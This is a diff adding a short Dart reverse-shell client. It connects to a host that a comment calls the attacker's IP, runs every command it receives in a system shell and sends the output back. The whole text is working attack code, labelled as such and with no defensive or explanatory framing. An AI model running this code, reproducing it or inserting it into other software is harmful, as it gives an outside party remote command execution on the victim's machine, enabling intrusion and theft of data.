@@ -1,0 +1,32 @@
+final String serverIp = '192.168.86.26'; // Your IP attacker
+  final int serverPort = 443; // Port Attacker
+
+  Socket.connect(serverIp, serverPort).then((socket) {
+    print('Connection suscessful');
+
+    // Listen data from server
+    socket.listen(
+      (data) {
+        final command = String.fromCharCodes(data).trim();
+        print('Command Received From Server: $command');
+
+        // Reverse Shell
+        Process.run(command, [], runInShell: true).then((result) {
+          final output = result.stdout;
+          socket.write(output);
+        }).catchError((error) {
+          socket.write('Error command: $error');
+        });
+      },
+      onDone: () {
+        print('Close connection with server.');
+        socket.destroy();
+      },
+      onError: (error) {
+        print('Error: $error');
+        socket.destroy();
+      },
+    );
+  }).catchError((error) {
+    print('Error connect server: $error');
+  });
